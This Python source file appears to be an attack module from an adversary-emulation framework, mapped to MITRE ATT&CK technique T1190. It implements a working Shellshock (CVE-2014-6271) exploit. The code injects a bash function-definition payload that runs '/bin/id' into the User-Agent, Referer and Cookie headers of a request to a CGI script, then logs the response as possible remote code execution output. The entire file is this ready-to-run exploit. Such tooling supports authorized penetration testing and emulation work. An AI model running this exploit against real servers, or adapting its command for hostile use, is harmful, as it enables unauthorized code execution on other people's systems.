import http.client
import logging

from modules.base_module import APT_MODULE
from models.target import Target, MESSAGE_TYPE
from models.module_metadata import AttackTactic, TargetOS, TargetArch


class shellshock(APT_MODULE):
    name = "Shellshock"
    description = (
        "Exploits CVE-2014-6271 (Shellshock) against a CGI-enabled Linux web server. "
        "Injects a bash function definition into HTTP headers (User-Agent, Referer, Cookie) "
        "to trigger remote code execution on vulnerable bash versions."
    )
    tactic = AttackTactic.INITIAL_ACCESS
    technique_id = "T1190"
    technique_name = "Exploit Public-Facing Application"
    compatible_os = [TargetOS.LINUX]
    compatible_arch = [TargetArch.ANY]

    cgi_path = "/cgi-bin/test.cgi"
    http_port = 80
    command = "/bin/id"

    def __init__(self) -> None:
        super().__init__()

    def action(self, target: Target):
        target.log_activity(
            f"Attempting Shellshock on {target.ip_label}:{self.http_port}{self.cgi_path}...", True)

        payload = f"() {{:;}}; echo; {self.command}"
        headers = {
            "User-Agent": payload,
            "Referer": payload,
            "Cookie": payload,
        }

        try:
            conn = http.client.HTTPConnection(target.ip_label, self.http_port, timeout=10)
            conn.request("GET", self.cgi_path, headers=headers)
            response = conn.getresponse()
            body = response.read().decode("utf-8", errors="replace")
            conn.close()

            if body.strip():
                target.log_activity(
                    f"Response ({response.status}) – possible RCE output:\n{body.strip()}",
                    True, MESSAGE_TYPE.SUCCESS,
                )
                target.update_field("is_alive", True)
            else:
                target.log_activity(
                    f"Response {response.status} – empty body, host may not be vulnerable",
                    True, MESSAGE_TYPE.INFORMATION,
                )
        except Exception as ex:
            logging.log(logging.ERROR, f"Shellshock error [{target.ip_label}]: {ex}")
            target.log_activity(f"Error: {ex}", True, MESSAGE_TYPE.ERROR)

    def enable(self, e):
        self.enabled = e
